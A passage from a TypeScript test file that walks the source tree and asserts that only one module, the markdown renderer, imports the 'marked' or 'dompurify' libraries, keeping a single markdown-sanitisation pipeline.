    const root = path.join(process.cwd(), 'src');
    const offenders: string[] = [];
    const walk = (dir: string): void => {
      for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
        const full = path.join(dir, entry.name);
        if (entry.isDirectory()) {
          walk(full);
          continue;
        }
        if (!/\.tsx?$/.test(entry.name) || /\.test\.tsx?$/.test(entry.name)) continue;
        // Any spelling that reaches either library: `from '…'`, a double-quoted
        // import, `require('…')`, a dynamic `import('…')`. A test whose whole
        // job is "there is exactly one pipeline" should not be defeated by a
        // quote character.
        if (/['"](marked|dompurify)['"]/.test(fs.readFileSync(full, 'utf8'))) {
          offenders.push(path.relative(root, full).replace(/\\/g, '/'));
        }
      }
    };
    walk(root);
    expect(offenders.sort()).toEqual(['renderer/src/lib/markdown.tsx']);
  });
});
